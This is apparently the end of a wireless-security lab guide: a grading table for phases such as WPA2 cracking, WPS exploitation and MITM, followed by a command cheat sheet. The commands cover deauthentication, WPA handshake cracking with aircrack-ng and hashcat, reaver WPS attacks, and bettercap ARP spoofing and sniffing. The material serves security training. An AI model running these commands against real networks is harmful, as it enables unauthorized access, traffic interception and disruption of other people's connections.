| WPA2 Handshake + PMKID (Phase 4) | 15 |
| WPS Exploitation (Phase 5) | 10 |
| Wordlist + WPA2 Crack (Phase 6) | 10 |
| Honeypot Deployment (Phase 7) | 10 |
| MITM + ARP Spoof + HTTPS Bypass (Phase 8) | 15 |
| Detection & Defence (Phase 9) | 5 |
| Challenge Flags | 5 |
| **Total** | **100** |

Pass mark: 65

---

## Quick Command Reference

```bash
# MONITOR MODE
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# SCAN
sudo airodump-ng wlan0mon

# TARGET SCAN + CAPTURE
sudo airodump-ng --bssid <MAC> --channel <CH> --write out wlan0mon

# DEAUTH
sudo aireplay-ng --deauth 10 -a <AP_MAC> wlan0mon

# WPA CRACK (aircrack)
aircrack-ng -w rockyou.txt -b <MAC> capture-01.cap

# WPA CRACK (hashcat)
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule

# WPS
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b <MAC> -c <CH> -K 1 -vvv

# BETTERCAP
sudo bettercap -iface eth0
> net.probe on; net.show
> set arp.spoof.targets <VICTIM_IP>; arp.spoof on
> net.sniff on
```
